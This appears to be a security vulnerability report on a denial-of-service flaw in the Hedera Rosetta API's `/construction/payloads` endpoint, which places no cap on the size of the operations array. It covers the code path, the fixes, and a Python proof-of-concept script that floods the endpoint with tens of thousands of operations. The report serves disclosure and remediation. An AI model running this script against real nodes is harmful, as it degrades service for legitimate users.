### Title
Unbounded Operations Array in `/construction/payloads` Enables Resource Exhaustion DoS

### Summary
The `ConstructionPayloads` endpoint accepts a `request.Operations` array of arbitrary size with no application-level cap. For every element, `getOperationSlice()` calls `types.NewAccountIdFromString()` and `types.NewAmount()`, then `transactionHandler.Construct()` iterates the full slice again building maps and calling `AddHbarTransfer()` per entry. An unauthenticated attacker can craft a single request with tens of thousands of operations to spike CPU and memory well above the 30% baseline threshold.

### Finding Description

**Exact code path:**

`rosetta/app/services/construction_service.go`, `ConstructionPayloads()`, lines 218–282:

```
operations, rErr := c.getOperationSlice(request.Operations)   // line 232
...
transaction, signers, rErr := c.transactionHandler.Construct(ctx, operations)  // line 237
```

`getOperationSlice()` (lines 432–465) iterates every element of the caller-supplied `[]*rTypes.Operation` slice with no size guard:

```go
for _, operation := range operations {
    accountId, err = types.NewAccountIdFromString(...)   // string parse + hex decode per entry
    ...
    amount, rErr = types.NewAmount(operation.Amount)     // currency lookup + big.Int parse per entry
    ...
}
```

`cryptoTransferTransactionConstructor.preprocess()` (lines 120–161) is then called by `Construct()` and iterates the full slice a second time, building a `senderMap` and a `totalAmounts` map, then calling `accountId.ToSdkAccountId()` per entry.

`validateOperations()` (`rosetta/app/services/construction/common.go`, line 123) is called with `size=0`, which explicitly disables any upper-bound check:

```go
if size != 0 && len(operations) != size {   // size==0 → branch never taken
    return errors.ErrInvalidOperations
}
```

**Root cause / failed assumption:** The code assumes callers supply a small, protocol-bounded operations list. No `http.MaxBytesReader`, no application-level `maxOperations` constant, and no body-size limit exist anywhere in the Go server stack. The only server-side guards are HTTP timeouts (`ReadTimeout: 5s`, `WriteTimeout: 10s`) configured in `main.go` (lines 220–227), which still permit multi-megabyte payloads within the window.

**Why infrastructure mitigations are insufficient:** The Traefik middleware chain in `charts/hedera-mirror-rosetta/values.yaml` (lines 149–166) defines `inFlightReq: amount: 5` and `rateLimit: average: 10`, but `global.middleware` defaults to `false` (line 95), so this chain is **not applied by default**. Even when enabled, it limits request *rate* and *concurrency* per IP, not the *size* of the operations array within a single request. An attacker using 5 concurrent connections, each carrying 20,000 operations, bypasses both controls.

### Impact Explanation
Each `/construction/payloads` request with N operations causes O(N) string parsing, O(N) hex decoding, O(N) `big.Int` arithmetic, O(N) map insertions, and O(N) SDK `AddHbarTransfer` calls — all synchronous and CPU-bound on a single goroutine. A request with ~50,000 balanced operations (e.g., alternating +1 / -1 HBAR so the sum-to-zero check passes) can saturate a CPU core for several seconds. Multiple concurrent such requests from different source IPs can push aggregate CPU and memory consumption well above 30% of the 24-hour baseline, degrading or denying service to legitimate users of all Rosetta endpoints sharing the same process.

### Likelihood Explanation
The endpoint is publicly reachable with no authentication. Crafting a valid payload requires only: a known node account ID (obtainable from `/network/list`), valid metadata timestamps, and a balanced operations array. The attacker needs no credentials, no on-chain funds, and no prior knowledge beyond the Rosetta API spec. The attack is trivially scriptable, repeatable at will, and effective from a single machine.

### Recommendation
1. **Enforce a hard operations-count cap** in `getOperationSlice()` before the loop:
   ```go
   const maxOperations = 1000
   if len(operations) > maxOperations {
       return nil, errors.ErrInvalidOperations
   }
   ```
2. **Add `http.MaxBytesReader`** in the HTTP handler chain in `main.go` to reject oversized request bodies before JSON decoding.
3. **Enable the Traefik middleware by default** (`global.middleware: true`) and add a per-IP `inFlightReq` limit scoped to the `/construction/payloads` and `/construction/preprocess` routes.

### Proof of Concept

```python
import requests, json

# Build 20000 balanced operations (10000 senders + 10000 receivers)
ops = []
for i in range(10000):
    ops.append({
        "operation_identifier": {"index": i*2},
        "type": "CRYPTOTRANSFER",
        "account": {"address": f"0.0.{1000+i}"},
        "amount": {"value": "-1", "currency": {"symbol": "HBAR", "decimals": 8}}
    })
    ops.append({
        "operation_identifier": {"index": i*2+1},
        "type": "CRYPTOTRANSFER",
        "account": {"address": f"0.0.{2000+i}"},
        "amount": {"value": "1", "currency": {"symbol": "HBAR", "decimals": 8}}
    })

payload = {
    "network_identifier": {"blockchain": "Hedera", "network": "testnet"},
    "operations": ops,
    "metadata": {
        "node_account_id": "0.0.3",
        "valid_duration": "180",
        "valid_start_nanos": "1700000000000000000"
    }
}

# Send multiple concurrent requests from different IPs / threads
resp = requests.post("http://<rosetta-host>:5700/construction/payloads",
                     json=payload, timeout=30)
print(resp.status_code, resp.elapsed.total_seconds())
# Repeat concurrently to exhaust CPU
```

Sending 5–10 such requests concurrently will cause sustained high CPU utilization on the Rosetta node, measurably exceeding the 30% baseline threshold.